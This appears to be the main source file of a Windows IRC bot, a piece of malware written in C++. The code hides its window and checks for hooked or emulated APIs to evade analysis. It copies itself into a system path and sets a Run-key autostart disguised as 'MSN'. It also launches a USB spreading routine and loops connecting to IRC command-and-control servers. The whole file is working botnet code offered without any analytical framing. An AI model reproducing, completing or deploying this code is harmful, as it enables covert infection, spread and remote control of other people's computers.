#include "Headers/includes.h"
#include "Headers/functions.h"
#include "Config/config.h"


#pragma comment(linker, "/subsystem:windows ")


DWORD dwstarted;
DWORD dwconnected;

IRC mainirc;
HANDLE xetum;
int curserver;
int srvsz=(sizeof(sinfo)/sizeof(SERVER));
int authsize=(sizeof(authost)/sizeof(LPTSTR));

extern char str_main_thread[];

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	DWORD id;
	HANDLE threadhandle;
	unsigned char szBytes[] = { 0xc8, 0x0, 0x4, 0x0, 0x60 }; 
    DWORD dwAddr = (DWORD)GetProcAddress(LoadLibrary("user32.dll"), "MessageBoxA"); 
	char cpbot[MAX_PATH];
	char movetopath[MAX_PATH];
	char spath[MAX_PATH];
	HKEY hndKey = NULL;
	char szTemp[MAX_PATH];

	// check if removable, then execute shell
	GetModuleFileName(0, szTemp, MAX_PATH - 1);
	szTemp[2] = 0;
	if (GetDriveType(szTemp) == DRIVE_REMOVABLE)
		ShellExecute(NULL, NULL, szTemp, NULL, NULL, SW_SHOWNORMAL);


	LoadDLLs();

    if(!memcmp((LPVOID)dwAddr, (LPVOID)szBytes, sizeof(szBytes))) 
    { 
        while (1) {}
        ExitProcess(0); 
    }



	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	ExpandEnvironmentStrings(gotopth,movetopath,sizeof(movetopath));
	sprintf(spath,"%s%s",movetopath,exename);
	
	if (MoveBot(movetopath,exename))
	{

		RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hndKey, NULL);
		RegSetValueEx(hndKey,"MSN",0, REG_SZ, (const unsigned char *)spath, strlen(spath));
		RegCloseKey(hndKey);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;
		if (CreateProcess(spath,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL,movetopath,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
		ExitProcess(1);
	}

	NTHREAD usb;
	usb.conn = &mainirc;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)USB_Spreader, &usb, 0, &id);

	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Bthd, NULL, 0, &id)) == 0)
		return 0;

	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
	return 0;
}


DWORD WINAPI Bthd(LPVOID param)
{
	//////////////////////////////////////////
	// Better way to create / check a mutex //
	//////////////////////////////////////////
	xetum = CreateMutex(NULL, FALSE, xetumhandle);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(0);

	addthread(MAIN_THREAD,str_main_thread,main_title);

	srand(GetTickCount());
	dwstarted=GetTickCount();


	WSADATA wsadata;
	if (fWSAStartup(MAKEWORD(2,2),&wsadata)!=0)
		ExitProcess(-2);

	
	int i=0;
	DWORD id=0;

	curserver=0;
	HookProtocol(&mainirc);
	
	while (mainirc.should_connect()) {
		if (!mainirc.is_connected())
		{
			mainirc.start(sinfo[curserver].host,sinfo[curserver].port,
					  mainirc.nickgen(NICK_TYPE,REQ_NICKLEN),mainirc.nickgen(IDENT_TYPE,REQ_IDENTLEN),
					  mainirc.nickgen(REALN_TYPE,REQ_REALNLEN),sinfo[curserver].pass);
			mainirc.message_loop();
		}
		else
			mainirc.message_loop();

		Sleep(SFLOOD_DELAY);
		
		if (curserver==(srvsz-1))
			curserver=0;
		else
			curserver++;
	}

	fWSACleanup();
	ReleaseMutex(xetum);
	ExitThread(0);

	return 0;
}